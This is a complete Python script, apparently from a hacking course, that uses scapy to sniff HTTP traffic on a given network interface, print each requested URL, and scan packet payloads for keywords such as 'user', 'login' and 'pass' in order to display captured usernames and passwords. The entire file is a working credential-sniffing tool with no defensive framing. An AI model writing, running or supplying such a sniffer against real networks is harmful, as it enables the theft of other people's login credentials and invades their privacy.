#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode()
            keywords = ["user", "uname", "login", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f'[+] HTTP Request >> {get_url(packet)}')
        if get_login_info(packet):
            print(f"\n\n\033[93m[+] Possible username/password > {get_login_info(packet)}\033[0m\n\n")

options = get_arguments()
sniff(options.interface)